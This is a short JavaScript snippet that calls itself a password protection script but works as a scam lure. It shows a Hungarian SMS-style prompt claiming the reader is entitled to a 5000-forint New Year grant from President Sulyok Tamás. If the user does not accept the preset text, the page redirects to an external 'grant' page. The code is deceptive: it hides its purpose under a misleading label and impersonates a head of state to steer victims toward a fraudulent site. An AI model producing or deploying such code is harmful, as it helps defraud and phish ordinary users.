  
/* Password Protection Script by www.onlineofferz.xyz*/
var password = 'FELVÉTEL 5000 Ft'
password = prompt(
  'SMS: Gratulálunk! Jogosult vagy Sulyok Tamás elnök 5000 forintos újévi ösztöndíjára. Kérjük, nyomd meg az OK gombot a készpénzfelvételhez..',
  'FELVÉTEL 5000 Ft'
);
if (password != 'FELVÉTEL 5000 Ft') {
  location.href = 'https://offres.org/grant-hu.html';
}
